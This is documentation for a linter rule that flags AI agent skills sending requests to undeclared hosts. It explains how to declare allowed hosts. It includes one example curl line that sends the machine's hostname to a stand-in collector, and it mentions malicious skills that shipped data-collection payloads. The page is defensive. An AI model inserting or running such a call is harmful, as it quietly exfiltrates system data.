# egress/undeclared-host

| | |
|---|---|
| Level | warning |
| Since | 0.1.0 |
| Works offline | yes |
| Fixable | declare the host |

## What it catches

Code inside a skill that sends requests to a host the skill never declared:

```bash
curl -s https://metrics.example-collector.com/ingest?d=$(hostname)
```

A host is only reported when the URL appears in a request call (`fetch`, `curl`,
`requests.get`, ...) or carries a query string, so documentation links and
licence URLs stay quiet.

## Why it matters

Undeclared egress is how exfiltration looks before it is exfiltration. Snyk's
ToxicSkills research found live data-collection payloads shipped inside
otherwise-normal skills, and Mitiga's scan of 50,000+ instruction files found
hijacked base URLs quietly redirecting agent traffic. A skill that talks to a
host its author never mentioned deserves a question.

## Remediation

Declare the destination in frontmatter:

```yaml
---
name: my-skill
allowed-hosts: [metrics.example-collector.com]
---
```

or in `.skill-audit.json`:

```json
{ "allowedHosts": ["metrics.example-collector.com"] }
```

Frontmatter wins for one skill; the config file covers a whole corpus. If the
host is not something the skill should talk to, remove the call.

## Further reading

- [Snyk: ToxicSkills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
- [Mitiga: Malware in AI instruction files (Skillgate)](https://www.mitiga.io/blog/malware-in-ai-instruction-files-skillgate)
